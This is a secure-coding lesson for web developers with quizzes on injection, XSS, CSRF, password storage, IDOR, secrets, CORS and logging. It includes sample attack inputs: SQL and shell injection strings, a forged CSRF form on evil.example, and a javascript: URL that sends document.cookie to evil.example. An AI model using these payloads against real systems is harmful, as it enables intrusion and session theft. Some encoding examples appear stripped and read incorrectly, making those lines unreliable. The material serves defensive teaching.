name: Secure Coding for the Web
author: Recurse
subject: swe
description: Spot and fix injection, XSS, CSRF, weak password storage, IDOR, leaked secrets, CORS mistakes and leaky logs.

lesson.intro: Most security bugs are ordinary code that trusts the wrong input: a string glued into SQL, a review rendered as HTML, an endpoint that never asks whose invoice this is. This lesson covers the OWASP Top 10 themes, each bug in code, and the fix.
objectives: Spot SQL and command injection and fix them with parameters and allowlists
Explain stored, reflected and DOM XSS and prevent them with output encoding
Defend against CSRF, and store passwords with Argon2id or bcrypt
Enforce access control on the server and prevent IDOR and mass assignment
Configure CORS, HSTS and CSP, keep secrets out of git, and log safely

sections.title: Injection: SQL and command injection
sections.key: Injection happens when untrusted input is parsed as code; keep data and code apart with parameterized queries and argument lists, and accept only allowlisted input.
sections.body:
A support tool looks up a customer by email; another endpoint pings a partner's host. Both hand a user's string to an interpreter, a database or a shell. That is the recipe for **injection**: input crossing into a place where it is parsed as code.

[[visual]]

The fixes keep data and code apart:

- **Parameterized queries**, every time: placeholders in the SQL, values passed separately. ORMs do this unless someone builds raw SQL with f-strings.
- For what placeholders cannot carry (a sort column, a table name), map the choice through an **allowlist**.
- Avoid the shell: use a library, or `subprocess.run([...])` with a list and no `shell=True` (in Node, `execFile` or `spawn`, not `exec`).
- **Validate** against what you expect, and reject leading dashes: a value like `--output` can still be read as an option (**argument injection**).

[[code]]

items.title: SQL injection
points: Input `' OR '1'='1' --` makes the query match every row
Other payloads read whole tables with `UNION SELECT` or change data

items.title: Command injection
items.sub: the same mistake with a shell
points: Input `8.8.8.8; cat /etc/passwd` runs a second command
Shells also expand `$(...)`, backticks, `&&`, pipes and redirections

sections.code:
# Validate, then run without a shell
def ping(host: str) -> bool:
    ipaddress.ip_address(host)  # or raise
    result = subprocess.run(
        # a list and no shell: ";" is text
        ["ping", "-c", "1", host],
        capture_output=True, timeout=5)
    return result.returncode == 0

# SQL: parameters, never string formatting
cur.execute(
    "SELECT id, name FROM customers"
    " WHERE email = %s", (email,))

# Identifiers: map through an allowlist
SORTS = {"newest": "created_at DESC",
         "name": "name ASC"}
order_by = SORTS.get(sort, SORTS["newest"])
sections.tip: Grep a codebase for `shell=True`, `os.system`, `exec(` and f-strings that contain SELECT or WHERE. Those few searches find most injection bugs.
sections.pitfall: Blocklisting dangerous characters such as `;`, `'` and `--`. Attackers have encodings and alternatives you did not think of; use parameters, argument lists and allowlists instead.

activity.title: Write an allowlist
activity.prompt: Allowlists beat blocklists. Write a pattern for each puzzle that accepts only the expected input and rejects everything else, including the injection attempts. Anchor both ends with ^ and $, or a payload can ride along after a valid prefix.

puzzles.prompt: Accept a plain hostname: letters, digits, dots and hyphens, starting with a letter or digit.
Accept only the sort keys price, name or created_at, and nothing else.

check.question: Why is `subprocess.run(["ping", "-c", "1", host])` safer than `os.system("ping -c 1 " + host)`?
choices: subprocess.run escapes every quote before passing the string to the shell
No shell parses the input, so characters like ; and $( ) stay inside one literal argument
It runs ping with lower operating system privileges
List arguments are encrypted before the call is made
check.explanation: With a list and no shell=True, the operating system starts ping directly with exactly those arguments. There is no shell to interpret ; or $( ), so no second command can be chained. It still pays to validate host, because of argument injection.

sections.title: XSS: stored, reflected and DOM
sections.key: XSS is injection into the victim's browser: encode output for the context it lands in, let the framework escape text, and treat innerHTML-style escape hatches as dangerous.
sections.body: A review contains ``, where the handler sends `document.cookie` to the attacker. Every visitor's browser parses it as HTML, `onerror` fires, and the attacker's JavaScript runs inside your site, calling your API as the victim. That is **cross-site scripting (XSS)**: [[visual]] The defense is **output encoding**: convert special characters so the browser shows text. In HTML, `<` becomes `<`, `>` becomes `>`, `&` becomes `&`, and in attributes quotes become `"` and `'`. Each context (HTML, attribute, URL, JavaScript string) has its own rules, and an `href` also needs its scheme checked: `javascript:alert(1)` has nothing to escape. React, Vue, Angular, Jinja2 and Django escape text by default. XSS returns through escape hatches: [[visual 2]] [[code]]

rows: **Stored XSS**
saved and served to every viewer, such as a review, profile bio or chat message: the most damaging
**Reflected XSS**
in the request, usually the URL, and echoed into the server's response, like `/search?q=<script>...` shown as "Results for ..."; the attacker sends victims a link
**DOM-based XSS**
never reaches the server: page JavaScript writes attacker-controlled data (the URL hash, a query parameter, `postMessage` data) into the page with `innerHTML`, `document.write` or `eval`
`element.innerHTML = userText`
`element.textContent = userText`
React `dangerouslySetInnerHTML`, Vue `v-html`, Jinja `|safe`, Django `mark_safe`
render as text; if HTML is truly needed (a rich-text editor), sanitize with DOMPurify, which keeps an allowlist of safe tags
`<a href={user.website}>`
allow only `http:` and `https:` URLs
visual.caption: A Content Security Policy (section 7) is a second layer that limits the damage if something slips through.

sections.tip: In code review, search for innerHTML, dangerouslySetInnerHTML, v-html, |safe and mark_safe. Each one needs a reason and a sanitizer.
sections.pitfall: Sanitizing input once on the way in and trusting it everywhere afterward. Encode on output, for the context you are writing into; one string may land in HTML, an attribute, a URL and JSON.

activity.title: Encode it
activity.prompt: Run it and read the encoded line: a browser would display it as text instead of building an img element. Then move the & replacement to the end of the chain and run again. The double-encoded &lt; shows why & must be escaped first.

props.code: function escapeHtml(text) { return text .replaceAll('&', '&') // must come first .replaceAll('<', '<') .replaceAll('>', '>') .replaceAll('"', '"') .replaceAll("'", ''') } const review = '' console.log('Raw: ' + review) console.log('Encoded: ' + escapeHtml(review))
props.task: Run it, then reorder the replacements and see what breaks.

check.question: A search page shows `You searched for: ...` by inserting the `q` parameter from the URL into the server-rendered HTML without encoding. Which kind of XSS is this?
choices: Reflected XSS
Stored XSS
DOM-based XSS
Cross-site request forgery
check.explanation: The payload travels in the request (the URL) and the server reflects it straight back into its response. Nothing is saved, so it is not stored XSS, and the server builds the HTML, so it is not DOM-based.

sections.title: CSRF and SameSite cookies
sections.key: In CSRF another site makes the victim's browser send a request with their cookies; SameSite cookies, CSRF tokens and Origin checks stop it, and GET must never change state.
sections.body:
You are logged in to your bank in one tab and open a forum post in another:

[[visual]]

That is **cross-site request forgery (CSRF)**: the attacker reads nothing but makes your browser act as you. It needs cookie authentication, a state-changing action, and nothing in the request the attacker cannot predict. Each defense removes one:

[[visual 2]]

[[code]]

APIs that authenticate only with an `Authorization: Bearer` header set by your JavaScript are not exposed to classic CSRF: browsers never attach that header themselves.

SameSite is about the **site** (scheme plus registrable domain), not the exact origin: `user-pages.example.com` and `app.example.com` are the same site.

messages.label: POST /transfer
messages.detail: to=attacker, amount=500, plus the session cookie

visual.caption: Cookies go to the site they belong to, whichever page started the request.

rows: `SameSite=Strict`
never sent cross-site, even when following a link (users arriving from an email look logged out)
`SameSite=Lax`
sent on top-level navigations with safe methods (clicking a link, a GET), not on cross-site POSTs, iframes, images or fetch: a good default
`SameSite=None`
always sent; requires `Secure`. Browsers differ when the attribute is missing, so set it
**CSRF token**
a random token in each form that the attacker's page cannot read; Django, Rails and Laravel check it for you
**Origin check**
reject state-changing requests from unexpected origins
**No state change on GET**
`GET /account/delete` fires on a mere navigation, and Lax cookies are still sent then

sections.code:
<!-- On https://evil.example -->
<form id="f" method="POST" action=
  "https://bank.example/transfer">
  <input type="hidden" name="to"
         value="attacker">
  <input type="hidden" name="amount"
         value="500">
</form>
<script>
  document.getElementById('f').submit()
</script>

<!-- The bank sets, at login:
  Set-Cookie: session=8f2c...; Path=/;
    Secure; HttpOnly; SameSite=Lax
  The cross-site POST now arrives with no
  cookie, so the bank rejects it. -->
sections.tip: Set `Secure; HttpOnly; SameSite=Lax` on session cookies by default, and keep your framework's CSRF protection switched on.
sections.pitfall: Assuming a JSON API is safe because "forms cannot send JSON". Forms can send `text/plain` bodies that lenient servers parse. Rely on SameSite, tokens and Origin checks.

check.question: Why does the forged transfer succeed when the session cookie has no SameSite protection?
choices: The attacker's page can read the bank's cookie
The bank's server has been compromised
The browser attaches the bank's cookie to the cross-site request automatically
HTTPS is turned off on the bank's site
check.explanation: CSRF does not need to read or steal the cookie: the victim's browser sends it along with any request to the bank. SameSite, CSRF tokens and Origin checks each stop that forged request from being accepted.

sections.title: Authentication and password storage
sections.key: Store passwords only with a slow, salted password hash such as Argon2id or bcrypt, verify with the library, and rate-limit logins behind one generic error message.
sections.body:
A database leaks with a `password` column holding `5f4dcc3b5aa765d61d8327deb882cf99`. Attackers know in seconds that it is `password`: its MD5 is in every lookup table online. Storage decides whether a breach hurts everyone who reused that password.

[[visual]]

A **salt** is a random value stored with each hash and mixed into it, so identical passwords hash differently and precomputed tables are useless. Verify with the library's check function, which re-hashes the attempt with the stored salt and settings.

[[code]]

The rest of authentication matters just as much:

[[visual 2]]

rows: Plaintext or reversible encryption
never: anything that can be decrypted eventually will be
MD5, SHA-1, SHA-256, even salted
never: built to be fast, and one GPU tries billions per second
**Argon2id**, **bcrypt** or scrypt
yes: deliberately slow, tunable (work factor or memory cost), with a random salt per password stored inside the hash string
**Rate-limit** logins per account and per IP
credential stuffing replays passwords leaked elsewhere
Multi-factor authentication
a stolen password alone is not enough
One message: "Invalid email or password"
the form cannot reveal which emails have accounts; same for resets: "If an account exists, we sent a link"
Regenerate the session id at login
prevents session fixation; also invalidate at logout and password change
Session cookies `HttpOnly`, `Secure`, `SameSite`, with expiry
scripts cannot read them, and they never travel unencrypted
Reset tokens long, random, single-use, short-lived, stored hashed
a leaked table of tokens is useless
Use your framework's auth, a known library or an identity provider
home-made schemes get this list wrong

sections.tip: Inherited a table of old MD5 or SHA-256 hashes? Re-hash each password with Argon2id or bcrypt the next time that user logs in successfully, when you briefly have the plaintext.
sections.pitfall: Adding a salt to SHA-256 and calling it done. Salting defeats precomputed tables, but SHA-256 is still fast enough to try billions of guesses per second.

check.question: Why are bcrypt and Argon2id better than SHA-256 for storing passwords?
choices: They produce shorter hashes that take less storage
They can be decrypted when a user forgets their password
SHA-256 is not actually a cryptographic hash function
They are deliberately slow and salted, so every guess costs an attacker far more
check.explanation: SHA-256 is a fine hash for integrity checks, but its speed makes password guessing cheap. Password hashing functions are slow by design, tunable as hardware improves, and salted per password. None of them can be decrypted.

sections.title: Access control and IDOR
sections.key: Authorization must be checked on the server for every request and every object: scope queries to the logged-in user and never trust ids or roles sent by the client.
sections.body:
Maya opens `/api/invoices/1043`, changes it to `1042`, and gets someone else's invoice. The API checked that she was logged in, never that the invoice was hers. That is an **IDOR** (insecure direct object reference); broken access control tops the OWASP Top 10.

**Authentication** asks "who are you?"; **authorization** (access control) asks "may you do this to this object?". Most breaches here are missing checks:

[[visual]]

[[code]]

Test like an attacker: log in as user A and replay user B's requests. Automated "A cannot read, edit or delete B's things" tests catch what review misses.

rows: Check on the server, every request, every object
hiding the admin button is not access control: anyone can call the API with curl
**Deny by default**
new endpoints stay closed until access is granted; middleware that requires an explicit permission helps
Scope queries to the user
`WHERE id = $1 AND owner_id = $2`; a missing row returns 404, "not found or not yours"
Never trust identity or roles from the client
a `role`, `user_id` or `price` in the body is attacker-controlled; take the user from the session, roles from the database
Watch for **mass assignment**
`Users.update(id, req.body)` accepts `{"role": "admin"}`; allowlist the fields a user may change
UUIDs are not a fix
they make guessing harder, but ids leak through URLs, logs, emails and shared links

sections.tip: For every endpoint that takes an id, ask: what stops user A from passing user B's id? "They would not know it" is not an answer.
sections.pitfall: Enforcing permissions only in the frontend by hiding buttons and routes. The API is open to anyone with developer tools or curl.

check.question: Which change actually fixes the invoice IDOR?
choices: Switching invoice ids from integers to random UUIDs
Scoping the query to the logged-in user: WHERE id = $1 AND owner_id = $2
Hiding links to other users' invoices in the UI
Requiring HTTPS on the invoices endpoint
check.explanation: Only a server-side ownership check stops Maya from reading invoice 1042. UUIDs make ids harder to guess but they still leak, hiding links changes nothing for someone using curl, and HTTPS protects the connection, not authorization.

sections.title: Secrets and dependencies
sections.key: Keep secrets out of code and git, rotate any secret that leaks before anything else, and treat every dependency as code you ship: lock, scan and question it.
sections.body:
A developer commits `.env` to a public repository at 4:12 p.m. By 4:15 a bot has found the cloud key, and by evening the account is mining cryptocurrency. Bots watch public commits continuously.

[[visual]]

If a secret leaks, **revoke and rotate it first**. Deleting the file in a new commit does not help: it stays in the history, every clone and every fork.

[[visual 2]]

**Dependencies** are code you ship too. Log4Shell, a 2021 flaw in the Java logging library Log4j, ran attacker code on servers that merely logged a crafted string, inside countless apps that never imported Log4j directly.

[[visual 3]]

visual.title: Secrets management
rows: Never in code or git
environment variables or a secret manager (AWS Secrets Manager, Google Secret Manager, HashiCorp Vault)
Ignore `.env` from day one
add it to `.gitignore`; commit a `.env.example` with placeholders
Scan for secrets
GitHub secret scanning and push protection, or gitleaks or trufflehog in pre-commit and CI
Browser code is public
Vite bundles every `VITE_` variable and Next.js every `NEXT_PUBLIC_` one into client code; call your server, which holds the key
Least privilege
separate keys per environment, so a leaked development key cannot touch production

steps.label: Revoke or rotate it at the provider
Deploy the new key everywhere it is needed
Check the provider's logs for misuse

visual.title: Dependency hygiene
rows: Commit **lockfiles**
`package-lock.json`, `poetry.lock`, `uv.lock`: every build installs what you tested
Scan continuously
`npm audit`, `pip-audit`, and Dependabot or Renovate update pull requests
Question new packages
check the exact name (typosquats like `reqeusts`), maintainers, downloads, ownership changes; install scripts run code
Remove unused packages
every package is attack surface

sections.tip: Treat every leaked secret as compromised, even if the repository was public for a minute or is private. Rotation is cheap; an incident is not.
sections.pitfall: Removing a committed key in the next commit and moving on. It is still in the history, in clones and forks, and probably already in a scanner's hands.

check.question: A teammate finds an API key that was committed last week and deleted in a later commit. What should happen first?
choices: Nothing, because the key is no longer in the latest commit
Revoke and rotate the key at the provider
Rewrite the git history to remove it, and keep using the key
Make the repository private
check.explanation: The key may already have been copied from the history, a clone or a scanner. Revoking it makes any stolen copy useless; history rewriting and access changes are cleanup that comes after.

sections.title: CORS, HTTPS, HSTS and security headers
sections.key: CORS only decides which other origins' pages may read your responses in a browser; it never blocks requests, so pair real authorization with HTTPS, HSTS and a strict CSP.
sections.body:
Your frontend at `app.example.com` calls `api.example.com` and the console says CORS blocked it. A teammate adds `Access-Control-Allow-Origin: *`; someone later reflects any origin with credentials. Both misunderstand CORS.

The **same-origin policy** stops JavaScript on one origin (scheme, host, port) from **reading** another origin's responses. **CORS** relaxes that: `Access-Control-Allow-Origin` names origins that may read. Non-simple requests (JSON bodies, custom headers, PUT, DELETE) first send an `OPTIONS` **preflight**.

[[visual]]

Never reflect the request's `Origin` together with `Access-Control-Allow-Credentials: true`: any site could then read users' data with their cookies. Use an explicit allowlist:

[[code]]

Serve everything over HTTPS, then add headers:

[[visual 2]]

items.title: CORS does
points: Tell the browser which other origins' pages may read a response

items.title: CORS does not
points: Protect your server: curl, scripts and attackers' servers ignore it
Stop CSRF: a simple form POST is sent and processed before the browser decides who may read the answer

visual.title: Security headers
rows: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
**HSTS**: use only HTTPS for this domain for max-age seconds, even if the user types http://. Ignored over plain HTTP; a first visit is covered only via the preload list
`Content-Security-Policy: script-src 'self'`

**CSP**: lists allowed sources; blocks inline scripts, inline handlers like `onerror` and other domains' scripts. `'unsafe-inline'` throws that away: use nonces or hashes, and test with `-Report-Only`
`frame-ancestors 'none'` (or `X-Frame-Options: DENY`)
no framing by other sites: stops clickjacking
`X-Content-Type-Options: nosniff`
no content-type guessing, so an uploaded "image" never runs as a script
`Referrer-Policy: strict-origin-when-cross-origin`
full URLs, which may hold tokens, do not leak to other sites

sections.tip: Check your headers in the browser's network tab or with a scanner such as Mozilla's HTTP Observatory before launch.
sections.pitfall: Treating CORS as protection for your API. It only decides which browser pages may read responses; it never stops a request from reaching your server.

check.question: What does CORS control?
choices: Which clients may send requests to your server at all
Whether traffic between browser and server is encrypted
Which other origins' JavaScript may read your responses in a browser
Which users are currently logged in
check.explanation: CORS only relaxes the browser's same-origin policy for reading responses. Requests from curl or servers are never blocked by it, and it has nothing to do with encryption or login state.

sections.title: Logging without leaking data
sections.key: Log security events with ids, IPs and request ids, but never passwords, tokens, cookies or card numbers; structured logging also stops forged log lines.
sections.body:
A debug line ships: `logger.info(f"login attempt {email} {password}")`. Six months later the logs, copied to a third-party service and readable by forty people, hold hundreds of thousands of plaintext passwords.

[[visual]]

Logging whole objects (`request.headers`, a body, a user) pulls in fields you never considered. Log specific fields, prefer ids to personal data (`user_id=8812`, not an email), and add a redaction filter as a safety net.

**Do log security events**: logins and failures, password and MFA changes, permission denials, admin actions. Without logs and alerts, breaches go unnoticed for months, which is its own OWASP Top 10 entry.

Users get a generic error and a request id; stack traces and SQL stay in the logs. And watch for **log injection**: a username containing a newline can forge a fake line in plain-text logs. Structured (JSON) logging prevents it.

[[code]]

items.title: Never log
points: Passwords, even failed attempts: a typo is one character from the real one
Session ids, tokens, API keys, password reset tokens
Full card numbers, security codes, bank details, government ids
Health and other sensitive personal data without a clear need

items.title: Do log
points: The event: login, failure, permission denied, admin action
A timestamp and the user id
A request id to tie it together

sections.tip: Search the codebase for log lines that format whole requests, headers, bodies or user objects. Each one is a leak waiting for the wrong field to be added.
sections.pitfall: Logging "just for debugging" and forgetting to remove it. Debug lines ship, logs get copied to other systems, and they are kept far longer than you expect.

check.question: Which log line is safe to keep in production?
choices: login failed email=dana@example.com password=hunter3
request headers: {'Authorization': 'Bearer eyJhbGciOi...'}
charge failed card=4111111111111111 cvc=123
login failed user_id=8812 ip=203.0.113.9 request_id=ab12
check.explanation: The last line records the security event with an id, an IP and a request id, which is everything you need to investigate. The others leak a password, a bearer token and full card details.

keyTerms.definition: Untrusted input reaching an interpreter (SQL, a shell, the browser) and being run as code.
SQL sent with placeholders and values passed separately, so input is never parsed as SQL.
Cross-site scripting: attacker-controlled script running in your site's pages, stored, reflected or DOM-based.
Converting special characters for the output context so the browser treats data as text.
Cross-site request forgery: another site makes the victim's browser send an authenticated request.
A cookie attribute (Strict, Lax, None) controlling whether it is sent on cross-site requests.
Slow, salted password hashing functions designed to make guessing expensive.
Insecure direct object reference: accessing another user's object by changing an id the server never checks.
Revoking a credential and issuing a new one, the first step after any leak.
Headers that let other origins' JavaScript read your responses; it never blocks requests from reaching the server.
Strict-Transport-Security: tells browsers to use only HTTPS for a domain for a set time.
A header listing allowed sources for scripts and other content, limiting the damage of XSS.

summary: Injection mixes data and code: use parameterized queries, argument lists without a shell, and allowlists.
Prevent XSS with context-aware output encoding, avoid innerHTML-style escape hatches, and sanitize HTML you must render.
Stop CSRF with SameSite cookies, CSRF tokens and Origin checks, and never change state on GET.
Hash passwords with Argon2id or bcrypt, rate-limit logins, and keep login messages generic.
Check authorization on the server for every object; rotate leaked secrets and scan dependencies.
CORS only controls which pages read responses; add HSTS and a strict CSP, and never log secrets.
lesson.feynmanPrompt: Explain to a new developer how an attacker could read other customers' invoices just by changing a number in the URL, and the server-side change that prevents it.

questions.question: What is the vulnerability in this lookup?
choices: fetchone() can return more than one row
password_hash should never be selected in a query
SQL injection: the email is concatenated into the SQL, so crafted input changes the query
The email must be lowercased before the lookup
questions.explanation: The email is concatenated into the SQL text, so an input such as `' OR '1'='1' --` rewrites the query. Use a placeholder: `db.execute("SELECT ... WHERE email = ?", (email,))`.

questions.question: What is the vulnerability in this admin tool?
choices: Command injection: with shell=True, input like `8.8.8.8; cat /etc/passwd` runs extra commands
check_output cannot run ping
request.form is read-only and raises an error
ping needs -c 4 to work reliably
questions.explanation: With shell=True the whole string goes to a shell, so `8.8.8.8; cat /etc/passwd` runs a second command on the server. Use `subprocess.run(["ping", "-c", "1", host])` without a shell, and validate host as an IP address or hostname.

questions.question: Complete the call so the id is sent as a bound parameter with node-postgres.
questions.code: const result = await db.query('SELECT * FROM orders WHERE id = $1', _____)
choices: req.params.id
[req.params.id]
`'${req.params.id}'`
{ id: req.params.id }
questions.explanation: node-postgres takes the values as an array matching $1, $2 and so on. A bare string or an object is the wrong shape, and building a quoted string reintroduces injection.

questions.question: A tool passes a user-supplied value to a program as one list argument with `subprocess.run`, and no shell. A user submits a value that begins with `--`. What risk remains?
choices: None, because list arguments can never be misinterpreted
Shell commands chained with a semicolon
The program may treat the value as an option (argument injection), so validate it and reject leading dashes
SQL injection through the argument list
questions.explanation: Without a shell, `;` and `$()` are harmless, but the program itself still parses its arguments, and a value starting with dashes can be read as an option. Validate the value against an allowlist and reject leading dashes, or pass `--` before user arguments where the program supports it.

questions.question: Match each term to the matching example or definition.

pairs.right: A malicious review is saved and runs for every visitor
A crafted link's query parameter is echoed into the server's response
Page JavaScript writes location.hash into innerHTML
Turning < into < so the browser shows text instead of markup

questions.explanation: Stored XSS is saved and served to others, reflected XSS bounces off the server from the request, DOM XSS happens entirely in page JavaScript, and output encoding is the defense that turns markup into text.

questions.question: What is the vulnerability here?
choices: URLSearchParams cannot read the q parameter
querySelector must be replaced with getElementById
innerHTML is slower than textContent
DOM XSS: q is inserted as HTML, so a crafted link runs script; use textContent
questions.explanation: The q parameter is written into the page as HTML, so a link with `q=` runs the attacker's script in your origin. Set textContent instead, which always treats the value as text.

questions.question: Users can edit their own bio. What is the vulnerability in this component?
choices: Stored XSS: the bio is inserted as raw HTML, bypassing React's escaping
{user.name} is not escaped by React
A section element cannot contain a div
dangerouslySetInnerHTML only works in class components
questions.explanation: React escapes {user.name}, but dangerouslySetInnerHTML bypasses escaping, so a bio containing an img tag with onerror runs for every profile visitor: stored XSS. Render the bio as text, or sanitize it with DOMPurify if rich formatting is needed.

questions.question: A profile page renders `My site`, applying HTML attribute encoding to the user's website value. Which value is still dangerous?
choices: https://example.com
javascript:fetch('https://evil.example/?c='+document.cookie)
<script>alert(1)</script>
">
questions.explanation: Encoding neutralizes quotes and angle brackets, so the last two values stay inert. `javascript:` contains nothing to encode, and clicking the link runs the code. URLs need their scheme checked: allow only http and https.

questions.question: The session cookie is `SameSite=Lax`. Which request started from an attacker's site still carries the victim's cookie?
choices: A cross-site form POST to https://bank.example/transfer
A fetch() call with credentials: 'include'
A top-level GET navigation to https://bank.example/account/delete?confirm=yes
An image request from an tag on the attacker's page
questions.explanation: Lax sends cookies on top-level navigations with safe methods, such as following a link. Cross-site POSTs, fetch calls and image requests go without it. That is exactly why state must never change on GET.

questions.question: What is the security problem with this route?
choices: login_required does not work on GET routes
A state-changing action on GET: another site can trigger it by navigating the user there, and Lax cookies are still sent
redirect leaks the user's password in the URL
delete() must be called after the redirect
questions.explanation: Deleting an account on GET means any site can trigger it by navigating the user there, and SameSite=Lax still sends cookies on top-level GET navigations. Use POST (or DELETE) with CSRF protection and a confirmation step.

questions.question: Which of these defend against CSRF? Select all that apply.
choices: SameSite=Lax or Strict on the session cookie
CSRF tokens checked on state-changing requests
Rejecting requests whose Origin header is not your site
Hiding the form's submit button from logged-out users
Switching from GET to POST with no other protection
Adding Access-Control-Allow-Origin: *
questions.explanation: SameSite cookies, CSRF tokens and Origin checks each stop forged cross-site requests. Hiding a button does nothing, a POST alone is still forgeable by an auto-submitting form, and a wildcard CORS header is unrelated (and often harmful).

questions.question: What is wrong with how this code stores passwords?
choices: The INSERT statement is vulnerable to SQL injection
SHA-256 is fast and unsalted here, so leaked hashes are cheap to crack; use Argon2id or bcrypt
hexdigest() makes the hash reversible
Passwords should be encrypted with AES instead
questions.explanation: SHA-256 is fast and, here, unsalted, so leaked hashes can be cracked at billions of guesses per second, and identical passwords share a hash. Use Argon2id or bcrypt. The INSERT itself is parameterized, so it is not an injection risk.

questions.question: Complete the function so it correctly checks a login attempt against the stored bcrypt hash.
questions.code:
def verify(password: str, stored_hash: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), _____)
choices: bcrypt.hashpw(password.encode(), bcrypt.gensalt())
bcrypt.gensalt()
stored_hash
hashlib.sha256(password.encode()).digest()
questions.explanation: checkpw takes the attempt and the stored hash, reads the salt and cost from the stored hash, and compares safely. Hashing the attempt again with a new salt would never match, and SHA-256 is a different algorithm entirely.

questions.question: A login form answers 'No account with that email' or 'Wrong password', depending on which is true. What is the problem?
choices: It reveals which emails have accounts, so use one generic message
It makes the login page noticeably slower
It means passwords are stored in plaintext
It stops password managers from filling the form
questions.explanation: Different messages let anyone discover which emails have accounts, which helps targeted phishing and credential stuffing. Use one message, 'Invalid email or password', and the same idea for password reset.

questions.question: Which of these are good authentication practices? Select all that apply.
choices: Hash passwords with Argon2id or bcrypt
Rate-limit login attempts per account and per IP
Regenerate the session id after a successful login
Encrypt passwords with AES so support staff can read them
Hash with SHA-256 and one site-wide salt
Email users their password after signup
questions.explanation: Slow salted hashing, rate limiting and a fresh session id after login are all standard. Reversible encryption, a fast hash with one shared salt, and emailing passwords all expose users' passwords.

questions.question: What is a salt, and why does every password get its own?
questions.answer: A salt is a random value stored with each password hash and mixed into the hashing. A unique salt per password makes identical passwords hash differently, so attackers cannot use precomputed tables or crack everyone who shares a password in one go.
questions.explanation: Argon2id and bcrypt handle salts automatically and store them inside the hash string, so you never manage them by hand.

questions.question: Any logged-in user can download this file endpoint's documents. What is the vulnerability?
choices: requireLogin must come after the route handler
res.download is vulnerable to SQL injection
IDOR: ownership is never checked, so changing the id downloads other users' documents
A missing document should return 500, not 404
questions.explanation: The handler checks that someone is logged in but never that the document belongs to them, so changing the id in the URL downloads other people's files. Scope the lookup to the user, for example findOne({ id, ownerId: req.user.id }).

questions.question: What can a user do with this endpoint that they should not be able to?
choices: Update other users' profiles by changing the URL
Read other users' password hashes
Nothing, because the user id comes from the session
Send fields such as {"role": "admin"} and grant themselves privileges, because the whole body is applied
questions.explanation: The whole request body is applied to the user's row, so a request with {"role": "admin"} or {"email_verified": true} grants privileges. The id comes from the session, so other users' rows are safe, but the fields must be allowlisted.

questions.question: The admin panel link is hidden from non-admins, but the `/api/admin/users` endpoint has no role check. Is hiding the link enough?
choices: Yes, users cannot find links that are hidden
Yes, as long as the site uses HTTPS
No, anyone can call the API directly, so the server must check the role on every request
No, but removing the link from the HTML source would be enough
questions.explanation: The API is reachable by anyone who sends the request, through curl or the browser's developer tools. The server must check the role on every request; hiding UI is a convenience, not security.

questions.question: A team switches invoice ids to random UUIDs and removes the ownership check, because 'nobody can guess them now'. What is wrong with that?
choices: UUIDs are easy to guess in sequence
Ids leak through links, logs and emails, so anyone holding one could read the invoice; the ownership check is still needed
UUIDs cannot be used with HTTPS
Nothing; unguessable ids are complete access control
questions.explanation: Unguessable ids still leak through shared links, emails, logs, browser history and referrer headers. Whoever holds one could read the invoice. Keep the server-side ownership check; UUIDs are a bonus, not a replacement.

questions.question: An API key was pushed to a public repository. Put the response steps in order.
items: Revoke or rotate the leaked key at the provider
Deploy the new key to every service that needs it
Check the provider's logs for misuse during the exposure
Remove the secret from the git history
Turn on secret scanning so it cannot happen silently again
questions.explanation: Revoking first makes any stolen copy useless. Then restore service with the new key, look for misuse during the exposure, and only then clean up history and add scanning so it cannot happen silently again.

questions.question: This code is in a React app built with Vite. What is the problem?
choices: VITE_ variables are bundled into client code, so every visitor can read the secret key
fetch cannot send an Authorization header
import.meta.env is always undefined in production builds
JSON.stringify exposes the key in the request body
questions.explanation: Vite bundles every VITE_ variable into the JavaScript sent to browsers, so any visitor can read the secret key and issue refunds. Secret keys must stay on your server; the browser calls your API, which calls the provider.

questions.question: Type the command that checks a Node.js project's dependencies for known vulnerabilities.
questions.explanation: npm audit compares your installed dependency tree, including transitive packages, against a database of known vulnerabilities. pip-audit does the same for Python environments.

questions.question: A pull request adds a dependency named `reqeusts` to requirements.txt. What should the reviewer suspect?
choices: A newer and faster fork of requests
A typosquatted package imitating requests, which may run malicious code
A harmless typo that pip corrects automatically
A Windows-only build of requests
questions.explanation: Typosquatted packages copy a popular name with a small misspelling and may run malicious code during install or import. pip installs exactly the name you give it; it never corrects spelling.

questions.question: An API team says: 'Our CORS policy only allows https://app.example.com, so attackers cannot call our API.' What is wrong with that claim?
choices: CORS policies expire after 24 hours
CORS applies only to GET requests
Nothing, because CORS blocks every other client
Only browsers enforce CORS; curl and scripts ignore it, so the API still needs real authentication and authorization
questions.explanation: CORS is enforced by browsers when a page tries to read a response. curl, scripts and other servers ignore it entirely, so the API still needs authentication and authorization on every request.

questions.question: What is the risk in this CORS middleware?
choices: Browsers reject every credentialed request it allows
Any website can make requests with users' cookies and read the responses
It blocks requests from your own frontend
It only matters for HTTP, not HTTPS
questions.explanation: Reflecting any Origin while allowing credentials means every website gets permission to make requests with the user's cookies and read the responses. A malicious page can then read logged-in users' data. Check the origin against an explicit allowlist.

questions.question: Which response header tells browsers to use only HTTPS for your domain for a set period of time?
questions.explanation: Strict-Transport-Security (HSTS), for example `Strict-Transport-Security: max-age=31536000; includeSubDomains`. Browsers ignore it when it arrives over plain HTTP.

questions.question: A site sends `Content-Security-Policy: script-src 'self' 'unsafe-inline'`. An attacker injects `` through an XSS bug. Does the CSP stop it?
choices: No: 'unsafe-inline' allows inline event handlers, so the injected handler runs
Yes: 'self' blocks every HTML attribute
Yes: CSP blocks all images from other domains
No, because CSP only applies to stylesheets
questions.explanation: 'unsafe-inline' allows inline scripts and inline event handlers, so the injected onerror runs. Without it, a script-src of 'self' would block the handler. Use nonces or hashes for legitimate inline scripts instead.

questions.question: What is the name of the response header that declares which sources may supply scripts, styles, images and frames on your pages?
questions.explanation: Content-Security-Policy. Roll a new policy out with Content-Security-Policy-Report-Only first, to see what it would block before enforcing it.

questions.question: What is the problem with this login handler?
choices: f-strings are not allowed inside logging calls
It should use logger.debug instead of logger.info
It writes plaintext passwords into the logs
The email should be logged in uppercase
questions.explanation: It writes every login attempt's password into the logs in plaintext, where many people and systems can read it for a long time. Log the event with an id or IP and a reason, never the password. Changing the log level would not fix the leak.

questions.question: Which of these should never be written to application logs? Select all that apply.
choices: Session cookies and Authorization headers
Full payment card numbers
Password reset tokens
The user id of a failed login attempt
Request ids
Timestamps of permission denials
questions.explanation: Session cookies, authorization headers, card numbers and reset tokens let anyone who reads the logs act as the user or steal money. User ids, request ids and timestamps of security events are exactly what logs are for.

